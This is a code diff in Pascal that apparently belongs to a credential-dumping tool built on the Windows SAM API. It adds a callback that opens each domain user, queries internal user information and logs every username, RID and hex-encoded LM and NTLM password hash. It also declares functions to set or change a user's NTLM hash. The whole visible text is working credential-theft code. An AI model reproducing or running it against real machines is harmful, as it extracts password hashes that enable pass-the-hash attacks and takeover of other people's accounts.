@@ -92,9 +92,14 @@ function SamSetInformationUser (UserHandle:thandle; UserInformationClass:dword; 
 //*************************************************************************
 
 procedure CreateFromStr (var value:_LSA_UNICODE_STRING; st : string);
+
 function QueryDomains(server:pchar;func:pointer =nil):boolean;
+
+function callback_QueryUsers(param:pointer=nil):dword;stdcall;
 function QueryUsers(server,_domain:pchar;func:pointer =nil):boolean;
+
 function SetInfoUser(server,user:string;hash:tbyte16):boolean; //aka setntlm
+
 function ChangeNTLM(server:string;user:string;previousntlm,newntlm:tbyte16):boolean;
 
 implementation
@@ -272,6 +277,40 @@ if Status <> 0 then
      begin log('SamCloseHandle failed:'+inttostr(status));exit;end
      else log('SamCloseHandle ok');
 end;
+
+function callback_QueryUsers(param:pointer=nil):dword;stdcall;
+var
+  status:ntstatus;
+  userhandle_:thandle=thandle(-1);
+  userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
+  lm,ntlm:string;
+begin
+result:=0;
+if param<>nil then
+     begin
+     //log(pdomainuser (param).rid) ;
+     //
+     Status := SamOpenUser(pdomainuser (param).domain_handle  , MAXIMUM_ALLOWED , pdomainuser (param).rid  , @UserHandle_);
+     if Status <> 0 then
+     begin log('SamOpenUser failed:'+inttohex(status,8),status);;end
+     else log('SamOpenUser ok',status);
+     //
+     status:=SamQueryInformationUser(UserHandle_ ,$12,userinfo);
+     if Status <> 0 then
+     begin log('SamQueryInformationUser failed:'+inttohex(status,8),status);;end
+     else log ('SamQueryInformationUser ok',status);
+     if status=0 then
+     begin
+     if (userinfo^.LmPasswordPresent=1 ) then lm:=ByteToHexaString (tbyte16(userinfo^.EncryptedLmOwfPassword)  );
+     if (userinfo^.NtPasswordPresent=1) then ntlm:=ByteToHexaString (tbyte16(userinfo^.EncryptedNtOwfPassword )  );
+     log(pdomainuser (param).username +':'+inttostr(pdomainuser (param).rid) +':'+lm+':'+ntlm,1);
+     result:=1;
+     SamFreeMemory(userinfo);
+     end;
+     //
+     end;
+end;
+
 
 function QueryUsers(server,_domain:pchar;func:pointer =nil):boolean;
 var
